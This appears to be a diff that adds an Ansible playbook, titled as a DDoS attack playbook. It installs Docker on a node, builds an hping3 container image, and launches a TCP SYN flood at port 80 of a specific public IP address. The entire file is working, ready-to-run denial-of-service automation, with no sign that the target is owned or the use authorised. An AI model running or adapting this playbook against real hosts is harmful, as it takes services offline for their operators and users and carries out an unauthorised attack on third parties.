@@ -1,0 +1,34 @@
+#DDoS Ansible Attack Playbook
+---
+- hosts: node1
+  become: true
+  tasks:
+    - name: Install Docker
+      yum:
+        name: docker
+        state: present
+
+    - name: Start Docker service
+      service:
+        name: docker
+        state: started
+        enabled: yes
+
+    - name: Create Dockerfile for hping3
+      copy:
+        content: |
+          FROM ubuntu:latest
+          RUN apt-get update && apt-get install -y hping3
+          ENTRYPOINT ["hping3"]
+        dest: /tmp/Dockerfile
+
+    - name: Build hping3 Docker image (using command module)
+      command: docker build -t custom-hping3 /tmp/
+
+    - name: Run hping3 flood attack
+      docker_container:
+        name: hping3_attack
+        image: custom-hping3
+        command: '-c 10000 -d 120 -S -w 64 -p 80 --flood 44.203.145.7' 
+        state: started
+        auto_remove: yes
